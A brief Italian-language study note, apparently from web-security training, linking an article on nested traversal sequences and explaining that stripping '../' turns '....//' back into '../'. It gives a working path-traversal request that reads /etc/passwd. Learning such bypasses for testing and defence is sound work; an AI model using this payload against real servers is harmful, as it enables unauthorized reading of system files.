
#websecurity #webexploitation 

https://kadalonsecurity.medium.com/using-nested-traversal-sequences-to-bypass-file-path-traversal-defense-3982feb4e60b

il codice strippa `../`, per cui di fatto `....//` ri-diventa `../`

```
GET /image?filename=....//....//....//....//....//etc/passwd HTTP/2
```

